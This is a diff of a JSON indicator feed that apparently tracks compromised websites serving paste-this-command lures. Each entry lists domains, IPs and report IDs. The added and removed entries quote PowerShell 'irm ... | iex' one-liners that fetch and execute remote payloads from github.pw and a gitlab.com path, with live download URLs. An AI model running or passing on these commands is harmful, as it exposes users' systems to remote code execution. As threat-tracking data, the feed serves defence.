@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "soporte5.jlmarketing.com.mx",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/wp/a99138664d16b6b2"
+    ],
+    "IP": [
+      "192.185.131.124"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/wp/a99138664d16b6b2')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/wp/a99138664d16b6b2"
+    ],
+    "ReportId": "cmwkmw4kx1f9x0omlu6etnpyg",
+    "ScannedAt": "2026-11-17T11:53:38.648000+00:00"
+  },
+  {
+    "UrlDomain": "imfobus.es",
+    "DeliveryUrl": [
+      "github.pw"
+    ],
+    "PayloadUrl": [
+      "https://github.pw/wp/4ff6ecee35528485"
+    ],
+    "IP": [
+      "217.160.0.14"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://github[.]pw/wp/4ff6ecee35528485')|iex",
+    "ResolvedDownloadUrl": [
+      "https://github.pw/wp/4ff6ecee35528485"
+    ],
+    "ReportId": "cmwkmw17h1f990oml8ubw5izj",
+    "ScannedAt": "2026-11-17T11:53:34.298000+00:00"
+  },
+  {
     "UrlDomain": "acfps.com",
     "DeliveryUrl": [
       "browse-cloud.codes"
@@ -2742,25 +2780,5 @@
     ],
     "ReportId": "cmwhtrhxt0u6a0omlo9x4ag7g",
     "ScannedAt": "2026-11-15T12:42:41.466000+00:00"
-  },
-  {
-    "UrlDomain": "adplaret.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "69.61.56.190"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
-    ],
-    "ReportId": "cmwhriwss0typ0omlc5n94jzl",
-    "ScannedAt": "2026-11-15T11:40:01.513000+00:00"
   }
 ]
